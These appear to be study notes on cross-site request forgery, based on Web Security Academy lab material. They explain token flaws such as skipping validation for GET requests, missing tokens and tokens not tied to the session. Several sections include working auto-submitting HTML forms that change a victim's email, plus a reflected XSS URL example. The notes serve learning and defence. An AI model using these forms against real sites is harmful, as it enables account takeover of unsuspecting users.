
### What is CSRF



Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce

users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same 

origin policy, which is designed to prevent different websites from interfering with each other.



In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For ex

ample, this might be to change the email address on their account, to change their password, or to make a 

funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality. 





 For a CSRF attack to be possible, three key conditions must be in place:



- A relevant action. There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).

- Cookie-based session handling. Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.

- No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.



 If a victim user visits the attacker's web page, the following will happen:



- The attacker's page will trigger an HTTP request to the vulnerable web site.

- If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).

- The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address.



``` html 

<html>

    <body>

        <form action="https://0a78000e0437732a88c3d30100180037.web-security-academy.net/my-account/change-email" method="POST">

            <input type="hidden" name="email" placeholder="Enter email"    value="csrf@csrf.com">

        </form>

        <script>

        window.onload = function() {

            document.forms[0].submit();

            //there is only 1 from in this page so index 0 

        }

        </script>

    </body>

</html>

```



Action is the website actual name we are targetting for CSRF

Instead of csrf@csrf.com use the email you want to change it to



### What is the difference between XSS and CSRF?



Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.

Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.





- CSRF often only applies to a subset of actions that a user is able to perform. Many applications implement CSRF defenses in general but overlook one or two actions that are left exposed. Conversely, a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.

- CSRF can be described as a "one-way" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is "two-way", in that the attacker's injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker's choosing.



### Can CSRF tokens prevent XSS attacks?



Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple reflected XSS vulnerability that can be trivially exploited like this:

https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>

Now, suppose that the vulnerable function includes a CSRF token: 

https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>



Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: "cross-site scripting", at least in its reflected form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.





- If a reflected XSS vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way.

- If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by CSRF tokens. In this situation, the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action.

- ***CSRF tokens do not protect against stored XSS vulnerabilities. If a page that is protected by a CSRF token is also the output point for a stored XSS vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page.***



### What is a CSRF token?



 A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and 

 shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the cl

 ient must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.



A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:



``` html

<form name="change-email-form" action="/my-account/change-email" method="POST">

    <label>Email</label>

    <input required type="email" name="email" value="example@normal-website.com">

    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">

    <button class='button' type='submit'> Update email </button>

</form>

```

 Submitting this form results in the following request: 

```HTTP

POST /my-account/change-email HTTP/1.1

Host: normal-website.com

Content-Length: 70

Content-Type: application/x-www-form-urlencoded



csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com

```

When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request. 



CSRF tokens don't have to be sent as hidden parameters in a POST request. Some applications place CSRF tokens in HTTP headers, for example. The way in which tokens are transmitted has a significant impact on the security of a mechanism as a whole.



### Common flaws in CSRF token validation



##### 1)Validation of CSRF token depends on request method



Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. 

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF 



```HTTP

GET /email/change?email=pwned@evil-user.net HTTP/1.1

Host: vulnerable-website.com

Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

```



```html



<html>

    <body>

        <form action="https://0a0d00f703d3369d8120adf8001e0067.web-security-academy.net/my-account/change-email">

            <input type="hidden" name="email" placeholder="Enter email"    value="csrf@csrf.com">

        </form>

        <script>

        window.onload = function() {

            document.forms[0].submit();

            //there is only 1 from in this page so index 0 

        }

        </script>

    </body>

</html>

```



##### 2)Validation of CSRF token depends on token being present



 Some applications correctly validate the token when it is present but skip the validation if the token is omitted.



In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:



```HTTP

POST /email/change HTTP/1.1

Host: vulnerable-website.com

Content-Type: application/x-www-form-urlencoded

Content-Length: 25

Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm



email=pwned@evil-user.net

```



```html

<html>

    <body>

        <form action="https://0a89004003f36c2586bf68bd004700ee.web-security-academy.net/my-account/change-email" method='POST'>

            <input type="hidden" name="email" placeholder="Enter email"    value="csrf@csrf.com">

        </form>

        <script>

        window.onload = function() {

            document.forms[0].submit();

            //there is only 1 from in this page so index 0 

        }

        </script>

    </body>

</html>

```

##### 3)CSRF token is not tied to the user session 



 Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.



In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.



Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.



```html

<body>

    <form action="https://0a67003c03f6b4f382f33d830070000f.web-security-academy.net/my-account/change-email" method="POST">

        <input type="hidden" name="email" value="csrf@csrf.com">

        <input type="hidden" name="csrf" value="izJtO1DbXwOZpLplPCaC2cESgcnFlp4e">



    </form>

    <script>

    window.onload = function() {

        document.forms[0].submit();

        //there is only 1 from in this page so index 0 

    }

    </script>

</body>

</html>

```

***CSRF tokens are single-use***



##### CSRF token is tied to a non-session cookie



some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together: 



```http 

POST /email/change HTTP/1.1

Host: vulnerable-website.com

Content-Type: application/x-www-form-urlencoded

Content-Length: 68

Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv



csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com

```

changing the session cookie logs you out, but changing the csrfKey cookie merely results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session. 



This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.





